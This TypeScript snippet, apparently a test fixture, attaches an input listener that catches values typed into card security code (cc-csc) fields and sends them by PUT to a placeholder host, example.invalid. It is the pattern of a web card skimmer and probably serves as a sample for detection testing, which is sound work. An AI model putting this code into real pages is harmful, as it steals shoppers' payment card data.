const fixtureEndpoint: string = 'https://example.invalid/fixture';

type FixtureDocument = {
  addEventListener(type: string, handler: (ev: { currentTarget: HTMLInputElement }) => void): void;
};

function inspect(document: FixtureDocument, globalThis: Window) {
  document.addEventListener('input', function (inputEvent) {
    if (inputEvent.currentTarget.matches('input[autocomplete="cc-csc"]')) {
      globalThis.fetch(fixtureEndpoint, {
        'method': 'PUT',
        'body': JSON.stringify({value: inputEvent.currentTarget.value}),
      });
    }
  });
}
